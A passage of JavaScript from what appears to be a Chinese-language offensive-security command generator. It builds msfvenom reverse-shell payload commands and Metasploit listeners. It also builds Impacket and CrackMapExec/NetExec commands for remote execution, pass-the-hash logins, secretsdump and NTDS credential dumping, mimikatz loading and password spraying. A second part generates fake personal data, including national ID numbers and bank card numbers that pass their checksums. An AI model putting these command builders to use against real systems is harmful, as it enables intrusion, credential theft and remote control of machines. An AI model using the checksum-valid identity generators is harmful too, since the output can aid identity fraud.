                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'hex':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'hex';
                    extension = '.hex';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
                case 'raw':
                    payload = 'windows/meterpreter/reverse_tcp';
                    format = 'raw';
                    extension = '.bin';
                    listenerCmd = `use exploit/multi/handler\nset payload ${payload}\nset LHOST ${lhost}\nset LPORT ${lport}\nexploit -j`;
                    break;
            }
            break;
    }

    let outputFileName = outputFile;
    if (extension && !outputFileName.endsWith(extension)) {
        outputFileName += extension;
    }

    const msfvenomCmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format} -o ${outputFileName}`;
    
    document.getElementById('msfvenomOutput').textContent = msfvenomCmd;
    document.getElementById('msfListenerOutput').textContent = listenerCmd;
}

// 优化后的复制到剪贴板功能
function copyToClipboard(text, button) {
    if (!text) return;
    
    // 使用 Promise 包装复制操作
    const copyPromise = navigator.clipboard.writeText(text).catch(() => {
        // 如果 Clipboard API 失败，使用备用方法
        return new Promise((resolve, reject) => {
            try {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                textarea.style.position = 'fixed';
                textarea.style.opacity = '0';
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                resolve();
            } catch (err) {
                reject(err);
            }
        });
    });

    // 处理复制结果
    copyPromise.then(() => {
        if (button) {
            const originalText = button.textContent || '';
            button.classList.add('copied');
            button.textContent = '已复制!';
            
            setTimeout(() => {
                button.classList.remove('copied');
                button.textContent = originalText;
            }, 2000);
        }
    }).catch(err => {
        console.error('复制失败:', err);
        alert('复制失败，请手动复制');
    });
}

function generateImpacketCommand() {
    const ip = document.getElementById('impacketIP').value;
    const username = document.getElementById('impacketUsername').value;
    const password = document.getElementById('impacketPassword').value;
    const hash = document.getElementById('impacketHash').value;
    const domain = document.getElementById('impacketDomain').value;
    const tool = document.getElementById('impacketTool').value;
    const command = document.getElementById('impacketCommand').value;
    const shellType = document.getElementById('impacketShellType').value;
    const actionType = document.getElementById('impacketActionType').value;
    const withOutput = document.getElementById('withOutput')?.checked || false;
    
    // 验证必填字段
    if (!ip || !username || !tool || !actionType) {
        alert('请填写所有必填字段');
        return;
    }

    // 验证密码或hash
    if (!password && !hash) {
        alert('请填写密码或Hash');
        return;
    }

    // 验证命令（如果是执行命令操作）
    if (actionType === 'execCommand' && !command) {
        alert('请填写要执行的命令');
        return;
    }

    // 验证shell类型（如果是交互式shell操作）
    if (actionType === 'interactiveShell' && !shellType) {
        alert('请选择Shell类型');
        return;
    }

    let commandString = '';
    let authString = '';
    let pythonCmd = 'python3'; // 默认使用python3

    // 构建认证字符串
    if (hash) {
        // 处理完整hash或仅NT hash的情况
        if (hash.includes(':')) {
            authString = `-hashes ${hash}`;
        } else {
            // 根据用户示例，使用全零LM hash
            authString = `-hashes 00000000000000000000000000000000:${hash}`;
        }
    } else {
        authString = password;
    }

    // 构建用户域字符串
    let userDomainString = '';
    if (domain) {
        userDomainString = `${domain}/${username}`;
    } else {
        // 处理工作组环境
        userDomainString = username;
        // 对于smbexec在工作组环境中的特殊处理
        if (tool === 'smbexec' && !domain) {
            userDomainString = `./${username}`;
        }
    }

    // 根据操作类型和工具生成命令
    switch(actionType) {
        case 'execCommand':
            switch(tool) {
                case 'wmiexec':
                    if (hash) {
                        commandString = `${pythonCmd} wmiexec.py ${authString} ${userDomainString}@${ip} "${command}"`;
                    } else {
                        commandString = `${pythonCmd} wmiexec.py ${userDomainString}:${authString}@${ip} "${command}"`;
                    }
                    break;
                case 'wmiexec-pro':
                    if (hash) {
                        commandString = `${pythonCmd} wmiexec-pro.py ${authString} ${userDomainString}@${ip} exec-command -command "${command}"`;
                        if (withOutput) {
                            commandString += " -with-output";
                        }
                    } else {
                        commandString = `${pythonCmd} wmiexec-pro.py ${userDomainString}:${authString}@${ip} exec-command -command "${command}"`;
                        if (withOutput) {
                            commandString += " -with-output";
                        }
                    }
                    break;
                case 'psexec':
                    if (hash) {
                        commandString = `${pythonCmd} psexec.py ${authString} ${userDomainString}@${ip} "${command}"`;
                    } else {
                        commandString = `${pythonCmd} psexec.py ${userDomainString}:${authString}@${ip} "${command}"`;
                    }
                    break;
                case 'smbexec':
                    if (hash) {
                        commandString = `${pythonCmd} smbexec.py ${authString} ${userDomainString}@${ip} "${command}"`;
                    } else {
                        commandString = `${pythonCmd} smbexec.py ${userDomainString}:${authString}@${ip} "${command}"`;
                    }
                    break;
                case 'atexec':
                    if (hash) {
                        commandString = `${pythonCmd} atexec.py ${authString} ${userDomainString}@${ip} "${command}"`;
                    } else {
                        commandString = `${pythonCmd} atexec.py ${userDomainString}:${authString}@${ip} "${command}"`;
                    }
                    // 添加静默命令选项
                    if (!withOutput) {
                        commandString += " -silentcommand";
                    }
                    break;
                case 'atexec-pro':
                    if (hash) {
                        commandString = `${pythonCmd} atexec-pro.py ${authString} ${userDomainString}@${ip} "${command}"`;
                    } else {
                        commandString = `${pythonCmd} atexec-pro.py ${userDomainString}:${authString}@${ip} "${command}"`;
                    }
                    break;
                case 'dcomexec':
                    if (hash) {
                        commandString = `${pythonCmd} dcomexec.py ${authString} ${userDomainString}@${ip} "${command}"`;
                    } else {
                        commandString = `${pythonCmd} dcomexec.py ${userDomainString}:${authString}@${ip} "${command}"`;
                    }
                    break;
            }
            break;

        case 'interactiveShell':
            switch(tool) {
                case 'wmiexec':
                    if (hash) {
                        commandString = `${pythonCmd} wmiexec.py ${authString} ${userDomainString}@${ip} -shell-type ${shellType}`;
                    } else {
                        commandString = `${pythonCmd} wmiexec.py ${userDomainString}:${authString}@${ip} -shell-type ${shellType}`;
                    }
                    break;
                case 'wmiexec-pro':
                    if (hash) {
                        commandString = `${pythonCmd} wmiexec-pro.py ${authString} ${userDomainString}@${ip} interactive-shell`;
                    } else {
                        commandString = `${pythonCmd} wmiexec-pro.py ${userDomainString}:${authString}@${ip} interactive-shell`;
                    }
                    break;
                case 'psexec':
                    if (hash) {
                        commandString = `${pythonCmd} psexec.py ${authString} ${userDomainString}@${ip}`;
                    } else {
                        commandString = `${pythonCmd} psexec.py ${userDomainString}:${authString}@${ip}`;
                    }
                    break;
                case 'smbexec':
                    if (hash) {
                        commandString = `${pythonCmd} smbexec.py ${authString} ${userDomainString}@${ip}`;
                    } else {
                        commandString = `${pythonCmd} smbexec.py ${userDomainString}:${authString}@${ip}`;
                    }
                    break;
                case 'dcomexec':
                    if (hash) {
                        commandString = `${pythonCmd} dcomexec.py ${authString} ${userDomainString}@${ip}`;
                        if (shellType) {
                            commandString += ` -shell-type ${shellType}`;
                        }
                    } else {
                        commandString = `${pythonCmd} dcomexec.py ${userDomainString}:${authString}@${ip}`;
                        if (shellType) {
                            commandString += ` -shell-type ${shellType}`;
                        }
                    }
                    break;
            }
            break;

        case 'dumpCredentials':
            if (tool === 'secretsdump') {
                if (hash) {
                    commandString = `${pythonCmd} secretsdump.py ${authString} ${userDomainString}@${ip}`;
                } else {
                    commandString = `${pythonCmd} secretsdump.py ${userDomainString}:${authString}@${ip}`;
                }
            } else {
                alert('凭据转储只能使用secretsdump工具');
                return;
            }
            break;
    }

    // 显示生成的命令
    const outputElement = document.getElementById('impacketOutput');
    if (outputElement) {
        outputElement.textContent = commandString;
    } else {
        alert('无法找到输出元素');
    }
}

function generateCmeCommand() {
    const actionType = document.getElementById('cmeActionType').value;
    const protocol = document.getElementById('cmeProtocol').value;
    const target = document.getElementById('cmeTarget').value;
    const username = document.getElementById('cmeUsername').value;
    const password = document.getElementById('cmePassword').value;
    const hash = document.getElementById('cmeHash').value;
    const command = document.getElementById('cmeCommand').value;
    
    // 根据选择的操作类型获取相应的选项
    let specificOption = '';
    
    switch(actionType) {
        case 'enumeration':
            const enumOptions = document.getElementById('cmeEnumOptions');
            if (enumOptions && enumOptions.value) {
                specificOption = enumOptions.value;
            }
            break;
            
        case 'credential':
            const credOptions = document.getElementById('cmeCredOptions');
            if (credOptions && credOptions.value) {
                specificOption = credOptions.value;
            }
            break;
    }
    
    // 获取协议特定选项
    const protocolSpecific = document.getElementById('cmeProtocolSpecific');
    let protocolOption = '';
    
    if (protocolSpecific && protocolSpecific.value) {
        protocolOption = protocolSpecific.value;
    }

    // 验证必填字段
    if (!actionType || !protocol || !target || !username) {
        alert('请填写必填字段：操作类型、协议、目标和用户名');
        return;
    }

    // 如果既没有密码也没有hash，则提示错误
    if (!password && !hash) {
        alert('请填写密码或Hash');
        return;
    }
    
    // 如果是execCommand操作，验证command
    if (actionType === 'execCommand' && !command) {
        alert('执行命令操作下必须填写命令');
        return;
    }

    // 构建基础命令
    let commandString = `./cme ${protocol} ${target}`;

    // 添加认证信息
    if (hash) {
        commandString += ` -u ${username} -H ${hash}`;
    } else {
        commandString += ` -u ${username} -p ${password}`;
    }

    // 添加协议特定选项
    if (protocolOption) {
        commandString += ` ${protocolOption}`;
    }
    
    // 添加操作特定选项
    if (specificOption) {
        commandString += ` ${specificOption}`;
    }

    // 如果是执行命令操作，添加命令
    if (actionType === 'execCommand' && command) {
        commandString += ` -x "${command}"`;
    }

    document.getElementById('cmeOutput').textContent = commandString;
}

// 初始化标签切换器
function initTabSwitcher(selector) {
    const tabButtons = document.querySelectorAll(selector);
    if (tabButtons.length > 0) {
        tabButtons.forEach(button => {
            button.addEventListener('click', function() {
                // 找到当前标签组
                const tabHeader = this.closest('.tabHeader');
                if (!tabHeader) return;
                
                // 找到所有相关的标签按钮
                const buttons = tabHeader.querySelectorAll('.tabButton');
                buttons.forEach(btn => btn.classList.remove('active'));
                
                // 激活当前标签
                this.classList.add('active');
                
                // 获取目标内容ID
                const targetId = this.getAttribute('data-target');
                if (!targetId) return;
                
                // 找到所有相关的标签内容
                const tabContents = tabHeader.parentElement.querySelectorAll('.tabContent');
                tabContents.forEach(content => content.classList.remove('active'));
                
                // 显示目标内容
                const targetContent = document.getElementById(targetId);
                if (targetContent) {
                    targetContent.classList.add('active');
                }
            });
        });
    }
}

function generateNxcCommand() {
    const actionType = document.getElementById('nxcActionType').value;
    const protocol = document.getElementById('nxcProtocol').value;
    const target = document.getElementById('nxcTarget').value;
    const username = document.getElementById('nxcUsername').value;
    const password = document.getElementById('nxcPassword').value;
    const hash = document.getElementById('nxcHash').value;
    const domain = document.getElementById('nxcDomain').value;
    const command = document.getElementById('nxcCommand').value;
    const codepage = document.getElementById('nxcCodepage').value;
    const localFile = document.getElementById('nxcLocalFile').value;
    const remoteFile = document.getElementById('nxcRemoteFile').value;
    const credentialType = document.getElementById('nxcCredentialType').value;
    const ntdsUser = document.getElementById('nxcNtdsUser').value;
    const moduleName = document.getElementById('nxcModuleName').value;
    const moduleOptions = document.getElementById('nxcModuleOptions').value;
    const otherOpsType = document.getElementById('nxcOtherOpsType').value;

    // 验证必填字段
    if (!actionType || !protocol || !target || !username) {
        alert('请填写必填字段: 操作类型、协议、目标、用户名');
        return;
    }

    // 如果既没有密码也没有hash且不是SSH，则提示错误
    if (!password && !hash && protocol !== 'ssh') {
        alert('请填写密码或Hash');
        return;
    }

    let commandString = '';
    
    // 构建基础命令部分
    const baseCommand = `./nxc ${protocol} ${target}`;
    
    // 添加代码页选项
    const codePageOption = codepage ? ` --code "${codepage}"` : '';
    
    // 添加域（如果有）
    const domainOption = domain ? ` -d ${domain}` : '';
    
    // 构建认证部分
    let authOption = '';
    if (hash) {
        authOption = ` -u ${username} -H ${hash}`;
    } else {
        authOption = ` -u ${username} -p "${password}"`;
    }

    // 根据操作类型生成不同命令
    switch(actionType) {
        case 'execCommand':
            if (!command) {
                alert('请填写要执行的命令');
                return;
            }
            commandString = `${baseCommand}${codePageOption}${domainOption}${authOption} -x "${command}"`;
            break;
            
        case 'fileTransfer':
            if (!localFile || !remoteFile) {
                alert('请填写本地和远程文件路径');
                return;
            }
            
            // 判断是上传还是下载
            if (remoteFile.startsWith('\\')) {
                // 上传操作
                commandString = `${baseCommand}${codePageOption}${domainOption}${authOption} --put-file ${localFile} ${remoteFile}`;
            } else {
                // 下载操作
                commandString = `${baseCommand}${codePageOption}${domainOption}${authOption} --get-file ${localFile} ${remoteFile}`;
            }
            break;
            
        case 'dumpCredentials':
            if (credentialType === '--ntds-user') {
                if (!ntdsUser) {
                    alert('请指定NTDS导出的用户名');
                    return;
                }
                commandString = `${baseCommand}${codePageOption}${domainOption}${authOption} --ntds --user ${ntdsUser}`;
            } else {
                commandString = `${baseCommand}${codePageOption}${domainOption}${authOption} ${credentialType}`;
            }
            break;
            
        case 'loadModule':
            if (!moduleName) {
                alert('请选择要加载的模块');
                return;
            }
            
            commandString = `${baseCommand}${codePageOption}${domainOption}${authOption} -M ${moduleName}`;
            
            if (moduleOptions && moduleName === 'mimikatz') {
                commandString += ` ${moduleOptions}`;
            }
            break;
            
        case 'passwordSpray':
            // 密码喷洒
            commandString = `${baseCommand}${codePageOption}${domainOption}${authOption}`;
            break;
            
        case 'otherOps':
            commandString = `${baseCommand}${codePageOption}${domainOption}${authOption} ${otherOpsType}`;
            break;
    }

    document.getElementById('nxcOutput').textContent = commandString;
}

// 使用防抖函数优化频繁操作
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// 优化后的随机信息生成函数
function generateRandomInfo() {
    // 使用 requestAnimationFrame 优化 DOM 更新
    requestAnimationFrame(() => {
        const randomData = {
            name: generateRandomName(),
            phone: generateRandomPhone(),
            idCard: generateRandomIdCard(),
            bankCard: generateRandomBankCard(),
            homeAddress: generateRandomHomeAddress(),
            deliveryAddress: generateRandomDeliveryAddress(),
            company: generateRandomCompany(),
            creditCode: generateRandomCreditCode(),
            education: generateRandomEducation(),
            password: generateRandomPassword()
        };

        // 批量更新 DOM
        Object.entries(randomData).forEach(([key, value]) => {
            const element = document.getElementById(`random${key.charAt(0).toUpperCase() + key.slice(1)}`);
            if (element) {
                element.textContent = value;
            }
        });
    });
}

// 使用防抖优化生成按钮点击事件
const debouncedGenerateRandomInfo = debounce(generateRandomInfo, 300);

// 随机姓名生成函数
function generateRandomName() {
    const surnames = ['张', '王', '李', '赵', '刘', '陈', '杨', '黄', '周', '吴', '徐', '孙', '马', '朱', '胡', '林', '郭', '何', '高', '罗'];
    const names = ['伟', '芳', '娜', '秀英', '敏', '静', '丽', '强', '磊', '军', '洋', '勇', '艳', '杰', '娟', '涛', '明', '超', '秀兰', '霞'];
    
    const randomSurname = surnames[Math.floor(Math.random() * surnames.length)];
    const randomName = names[Math.floor(Math.random() * names.length)];
    
    return randomSurname + randomName;
}

// 随机手机号生成函数
function generateRandomPhone() {
    // 更全面的手机号前缀，按运营商分类
    const prefixes = {
        // 中国移动
        mobile: [
            '134', '135', '136', '137', '138', '139', '147', '148', '150', '151', '152', '157', '158', '159',
            '165', '172', '178', '182', '183', '184', '187', '188', '195', '197', '198',
            // 新增5G号段
            '144', '146', '148', '154', '156', '164', '174', '184', '194'
        ],
        // 中国联通
        unicom: [
            '130', '131', '132', '145', '146', '155', '156', '166', '167', '171', '175', '176', '185', '186', '196',
            // 新增5G号段
            '140', '141', '142', '143', '149', '154', '166', '174', '184', '194'
        ],
        // 中国电信
        telecom: [
            '133', '149', '153', '173', '174', '177', '180', '181', '189', '190', '191', '193', '199',
            // 新增5G号段
            '141', '144', '149', '162', '165', '174', '192', '193', '194'
        ],
        // 虚拟运营商
        virtual: [
            '162', '165', '167', '170', '171', '172', '173', '174', '175', '176', '191', '192', '193', '195', '196', '197', '198', '199'
        ]
    };
    
    // 随机选择一个运营商
    const operators = Object.keys(prefixes);
    const operator = operators[Math.floor(Math.random() * operators.length)];
    
    // 从选定的运营商中随机选择一个前缀
    const operatorPrefixes = prefixes[operator];
    const randomPrefix = operatorPrefixes[Math.floor(Math.random() * operatorPrefixes.length)];
    
    // 生成剩余8位随机数字
    let randomNumber = '';
    for (let i = 0; i < 8; i++) {
        randomNumber += Math.floor(Math.random() * 10);
    }
    
    return randomPrefix + randomNumber;
}

// 随机身份证号生成函数
function generateRandomIdCard() {
    // 常用的省级行政区划代码
    const areaCodes = [
        '110000', '120000', '130000', '140000', '150000', '210000', '220000', '230000',
        '310000', '320000', '330000', '340000', '350000', '360000', '370000', '410000',
        '420000', '430000', '440000', '450000', '460000', '500000', '510000', '520000',
        '530000', '540000', '610000', '620000', '630000', '640000', '650000'
    ];
    
    // 随机选择一个省级代码
    const provinceCode = areaCodes[Math.floor(Math.random() * areaCodes.length)];
    
    // 随机生成后四位区县代码
    let districtCode = '';
    for (let i = 0; i < 4; i++) {
        districtCode += Math.floor(Math.random() * 10);
    }
    
    // 组合成六位行政区划代码
    const areaCode = provinceCode.substring(0, 2) + districtCode;
    
    // 生成随机出生日期 (1950-2005年)
    const year = 1950 + Math.floor(Math.random() * 56);
    const month = 1 + Math.floor(Math.random() * 12);
    
    // 根据月份确定天数
    let maxDay = 31;
    if ([4, 6, 9, 11].includes(month)) {
        maxDay = 30;
    } else if (month === 2) {
        // 处理闰年
        maxDay = ((year % 4 === 0 && year % 100 !== 0) || year % 400 === 0) ? 29 : 28;
    }
    
    const day = 1 + Math.floor(Math.random() * maxDay);
    
    const birthDate = year.toString() + 
                      (month < 10 ? '0' + month : month) + 
                      (day < 10 ? '0' + day : day);
    
    // 生成随机顺序码 (男性为奇数，女性为偶数)
    let sequenceCode = '';
    for (let i = 0; i < 2; i++) {
        sequenceCode += Math.floor(Math.random() * 10);
    }
    
    // 随机性别码
    const genderCode = Math.floor(Math.random() * 10);
    sequenceCode += genderCode;
    
    // 计算校验码
    const idCardBase = areaCode + birthDate + sequenceCode;
    const weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2];
    const checkCodes = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2'];
    
    let sum = 0;
    for (let i = 0; i < 17; i++) {
        sum += parseInt(idCardBase[i]) * weights[i];
    }
    
    const checkCode = checkCodes[sum % 11];
    
    return idCardBase + checkCode;
}

// 随机银行卡号生成函数
function generateRandomBankCard() {
    // 常见的银行卡BIN前缀
    const binPrefixes = [
        '621226', '621225', '621224', '621661', '622150', '622151', // 工商银行
        '622700', '622701', '622702', '622703', // 建设银行
        '622908', '622909', '622910', '622911', // 农业银行
        '621558', '621559', '621560', '621561', // 中国银行
        '622588', '622589', '622590', '622591', // 交通银行
        '622600', '622601', '622602', '622603', // 招商银行
        '622630', '622631', '622632', '622633', // 中信银行
        '622650', '622651', '622652', '622653', // 浦发银行
        '622660', '622661', '622662', '622663', // 光大银行
        '622680', '622681', '622682', '622683'  // 民生银行
    ];
    
    // 随机选择一个BIN前缀
    const binPrefix = binPrefixes[Math.floor(Math.random() * binPrefixes.length)];
    
    // 确定卡号长度 (大多数银行卡为16位，少数为19位)
    const length = Math.random() < 0.8 ? 16 : 19;
    
    // 生成除了BIN前缀和校验位之外的随机数字
    let cardNumber = binPrefix;
    for (let i = binPrefix.length; i < length - 1; i++) {
        cardNumber += Math.floor(Math.random() * 10);
    }
    
    // 使用Luhn算法计算校验位
    let sum = 0;
    let alternate = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        if (alternate) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        sum += digit;
        alternate = !alternate;
    }
    
    // 计算校验位
    const checkDigit = (10 - (sum % 10)) % 10;
    
    // 返回完整的银行卡号
    return cardNumber + checkDigit;
}

// 随机家庭住址生成函数
function generateRandomHomeAddress() {
    // 更全面的省份数据
    const provinces = [
        '北京市', '天津市', '河北省', '山西省', '内蒙古自治区', '辽宁省', '吉林省', '黑龙江省',
        '上海市', '江苏省', '浙江省', '安徽省', '福建省', '江西省', '山东省', '河南省',
        '湖北省', '湖南省', '广东省', '广西壮族自治区', '海南省', '重庆市', '四川省', '贵州省',
        '云南省', '西藏自治区', '陕西省', '甘肃省', '青海省', '宁夏回族自治区', '新疆维吾尔自治区'
    ];
    
    // 主要城市数据，按省份分组
    const citiesMap = {
        '北京市': ['东城区', '西城区', '朝阳区', '海淀区', '丰台区', '石景山区', '门头沟区', '房山区', '通州区', '顺义区'],
        '上海市': ['黄浦区', '徐汇区', '长宁区', '静安区', '普陀区', '虹口区', '杨浦区', '浦东新区', '闵行区', '宝山区'],
        '广东省': ['广州市', '深圳市', '珠海市', '汕头市', '佛山市', '韶关市', '湛江市', '肇庆市', '江门市', '茂名市'],
        '浙江省': ['杭州市', '宁波市', '温州市', '嘉兴市', '湖州市', '绍兴市', '金华市', '衢州市', '舟山市', '台州市'],
        '江苏省': ['南京市', '无锡市', '徐州市', '常州市', '苏州市', '南通市', '连云港市', '淮安市', '盐城市', '扬州市'],
        '四川省': ['成都市', '自贡市', '攀枝花市', '泸州市', '德阳市', '绵阳市', '广元市', '遂宁市', '内江市', '乐山市'],
        '贵州省': ['贵阳市', '遵义市', '六盘水市', '安顺市', '毕节市', '铜仁市', '黔西南布依族苗族自治州', '黔东南苗族侗族自治州', '黔南布依族苗族自治州']
    };
    
    // 默认城市列表，当选择的省份不在citiesMap中时使用
    const defaultCities = ['市辖区', '县', '主城区', '新区', '开发区'];
    
    // 区县数据
    const districtsMap = {
        '北京市': ['朝阳区', '海淀区', '丰台区', '石景山区', '门头沟区', '房山区', '通州区', '顺义区', '昌平区', '大兴区'],
        '上海市': ['黄浦区', '徐汇区', '长宁区', '静安区', '普陀区', '虹口区', '杨浦区', '浦东新区', '闵行区', '宝山区'],
        '广州市': ['越秀区', '荔湾区', '海珠区', '天河区', '白云区', '黄埔区', '番禺区', '花都区', '南沙区', '从化区'],
        '深圳市': ['福田区', '罗湖区', '南山区', '宝安区', '龙岗区', '盐田区', '龙华区', '坪山区', '光明区', '大鹏新区'],
        '贵阳市': ['南明区', '云岩区', '花溪区', '乌当区', '白云区', '观山湖区', '清镇市', '开阳县', '息烽县', '修文县']
    };
    
    // 默认区县列表
    const defaultDistricts = ['城区', '郊区', '新区', '开发区', '高新区', '工业区', '经济开发区', '科技园区'];
    
    // 街道名称
    const streets = [
        '中华路', '中山路', '北京路', '延安路', '解放路', '新华路', '人民路', '和平路', '友谊路', '文化路',
        '建设路', '兴业路', '繁华大道', '幸福路', '富强路', '胜利路', '光明街', '希望路', '未来路', '创业路',
        '科技大道', '创新路', '发展大道', '昌盛路', '兴旺路', '繁荣路', '昌平路', '东风路', '西风路', '南风路'
    ];
    
    // 小区名称
    const communities = [
        '阳光小区', '和谐家园', '幸福花园', '和平小区', '友谊小区', '文化小区', '人民小区', '解放小区', '新华小区', '中华小区',
        '锦绣花园', '金色家园', '翠竹园', '碧水湾', '蓝天花园', '绿地花园', '紫荆花园', '玫瑰园', '百合花园', '康乐家园',
        '富丽花园', '丽景花园', '御景花园', '豪庭花园', '名都花园', '世纪花园', '星河湾', '香榭丽舍', '凯旋门', '帝景苑'
    ];
    
    // 随机选择省份
    const province = provinces[Math.floor(Math.random() * provinces.length)];
    
    // 根据省份选择城市
    let cities = citiesMap[province] || defaultCities;
    const city = cities[Math.floor(Math.random() * cities.length)];
    
    // 根据城市选择区县
    let districts = districtsMap[city] || districtsMap[province] || defaultDistricts;
    const district = districts[Math.floor(Math.random() * districts.length)];
    
    // 随机选择街道、小区和房屋信息
    const street = streets[Math.floor(Math.random() * streets.length)];
    const community = communities[Math.floor(Math.random() * communities.length)];
    const building = Math.floor(Math.random() * 30) + 1;
    const unit = Math.floor(Math.random() * 8) + 1;
    const room = Math.floor(Math.random() * 2000) + 101;
    
    // 格式化地址
    return `${province}${city}${district}${street}${community}${building}栋${unit}单元${room}室`;
}

// 随机收货地址生成函数
function generateRandomDeliveryAddress() {
    // 复用家庭住址生成函数中的省份、城市和区县数据
    // 更全面的省份数据
    const provinces = [
        '北京市', '天津市', '河北省', '山西省', '内蒙古自治区', '辽宁省', '吉林省', '黑龙江省',
        '上海市', '江苏省', '浙江省', '安徽省', '福建省', '江西省', '山东省', '河南省',
        '湖北省', '湖南省', '广东省', '广西壮族自治区', '海南省', '重庆市', '四川省', '贵州省',
        '云南省', '西藏自治区', '陕西省', '甘肃省', '青海省', '宁夏回族自治区', '新疆维吾尔自治区'
    ];
    
    // 主要城市数据，按省份分组
    const citiesMap = {
        '北京市': ['东城区', '西城区', '朝阳区', '海淀区', '丰台区', '石景山区', '门头沟区', '房山区', '通州区', '顺义区'],
        '上海市': ['黄浦区', '徐汇区', '长宁区', '静安区', '普陀区', '虹口区', '杨浦区', '浦东新区', '闵行区', '宝山区'],
        '广东省': ['广州市', '深圳市', '珠海市', '汕头市', '佛山市', '韶关市', '湛江市', '肇庆市', '江门市', '茂名市'],
        '浙江省': ['杭州市', '宁波市', '温州市', '嘉兴市', '湖州市', '绍兴市', '金华市', '衢州市', '舟山市', '台州市'],
        '江苏省': ['南京市', '无锡市', '徐州市', '常州市', '苏州市', '南通市', '连云港市', '淮安市', '盐城市', '扬州市'],
        '四川省': ['成都市', '自贡市', '攀枝花市', '泸州市', '德阳市', '绵阳市', '广元市', '遂宁市', '内江市', '乐山市'],
        '贵州省': ['贵阳市', '遵义市', '六盘水市', '安顺市', '毕节市', '铜仁市', '黔西南布依族苗族自治州', '黔东南苗族侗族自治州', '黔南布依族苗族自治州']
    };
    
    // 默认城市列表，当选择的省份不在citiesMap中时使用
    const defaultCities = ['市辖区', '县', '主城区', '新区', '开发区'];
    
    // 区县数据
    const districtsMap = {
        '北京市': ['朝阳区', '海淀区', '丰台区', '石景山区', '门头沟区', '房山区', '通州区', '顺义区', '昌平区', '大兴区'],
        '上海市': ['黄浦区', '徐汇区', '长宁区', '静安区', '普陀区', '虹口区', '杨浦区', '浦东新区', '闵行区', '宝山区'],
        '广州市': ['越秀区', '荔湾区', '海珠区', '天河区', '白云区', '黄埔区', '番禺区', '花都区', '南沙区', '从化区'],
        '深圳市': ['福田区', '罗湖区', '南山区', '宝安区', '龙岗区', '盐田区', '龙华区', '坪山区', '光明区', '大鹏新区'],
        '贵阳市': ['南明区', '云岩区', '花溪区', '乌当区', '白云区', '观山湖区', '清镇市', '开阳县', '息烽县', '修文县']
    };
    
    // 默认区县列表
    const defaultDistricts = ['城区', '郊区', '新区', '开发区', '高新区', '工业区', '经济开发区', '科技园区'];
    
    // 街道名称
    const streets = [
        '中华路', '中山路', '北京路', '延安路', '解放路', '新华路', '人民路', '和平路', '友谊路', '文化路',
        '建设路', '兴业路', '繁华大道', '幸福路', '富强路', '胜利路', '光明街', '希望路', '未来路', '创业路',
        '科技大道', '创新路', '发展大道', '昌盛路', '兴旺路', '繁荣路', '昌平路', '东风路', '西风路', '南风路'
    ];
    
    // 更全面的地标建筑
    const landmarks = [
        '沃尔玛超市', '家乐福超市', '大润发超市', '华润万家', '永辉超市', '世纪联华', '苏宁易购', '国美电器', '万达广场', '星力百货',
        '银泰百货', '王府井百货', '茂业百货', '天虹商场', '华联商厦', '新世界百货', '百盛购物中心', '大悦城', '龙湖天街', 'IKEA宜家',
        '麦当劳', '肯德基', '必胜客', '星巴克', '海底捞', '西贝莜面村', '真功夫', '大娘水饺', '味千拉面', '吉野家',
        '中国银行', '工商银行', '建设银行', '农业银行', '交通银行', '招商银行', '浦发银行', '中信银行', '光大银行', '民生银行',
        '体育馆', '图书馆', '博物馆', '科技馆', '文化中心', '青少年宫', '游泳馆', '健身中心', '电影院', '剧院'
    ];
    
    // 随机选择省份
    const province = provinces[Math.floor(Math.random() * provinces.length)];
    
    // 根据省份选择城市
    let cities = citiesMap[province] || defaultCities;
    const city = cities[Math.floor(Math.random() * cities.length)];
    
    // 根据城市选择区县
    let districts = districtsMap[city] || districtsMap[province] || defaultDistricts;
    const district = districts[Math.floor(Math.random() * districts.length)];
    
    // 随机选择街道和地标
    const street = streets[Math.floor(Math.random() * streets.length)];
    const landmark = landmarks[Math.floor(Math.random() * landmarks.length)];
    
    // 随机生成建筑信息
    const building = Math.floor(Math.random() * 30) + 1;
    const unit = Math.floor(Math.random() * 8) + 1;
    const room = Math.floor(Math.random() * 2000) + 101;
    
    // 随机决定是否添加详细门牌号
    const includeDetailedAddress = Math.random() > 0.3;
    
    // 格式化地址
    if (includeDetailedAddress) {
        return `${province}${city}${district}${street}${landmark}附近${building}栋${unit}单元${room}室`;
    } else {
        return `${province}${city}${district}${street}${landmark}附近`;
    }
}

// 随机公司名称生成函数
function generateRandomCompany() {
    // 更全面的地区前缀
    const prefixes = [
        // 直辖市
        '北京', '上海', '天津', '重庆',
        // 省会城市
        '广州', '南京', '杭州', '武汉', '成都', '长沙', '西安', '济南', '哈尔滨', '沈阳', 
        '长春', '南昌', '福州', '贵阳', '昆明', '兰州', '太原', '合肥', '郑州', '石家庄',
        '呼和浩特', '乌鲁木齐', '拉萨', '南宁', '银川', '海口', '西宁',
        // 经济发达城市
        '深圳', '苏州', '宁波', '青岛', '大连', '厦门', '珠海', '佛山', '东莞', '无锡',
        '常州', '温州', '中山', '烟台', '泉州', '南通', '镇江',
        // 省份
        '广东', '江苏', '浙江', '山东', '河南', '河北', '湖南', '湖北', '四川', '辽宁',
        '江西', '福建', '安徽', '山西', '陕西', '广西', '贵州', '云南', '甘肃', '黑龙江',
        '吉林', '内蒙古', '新疆', '西藏', '宁夏', '海南', '青海'
    ];
    
    // 更全面的行业类型
    const types = [
        // 科技类
        '科技', '信息', '网络', '软件', '电子', '通信', '数据', '智能', '数字', '互联网',
        '人工智能', '区块链', '云计算', '大数据', '物联网', '芯片', '半导体', '机器人', '生物科技',
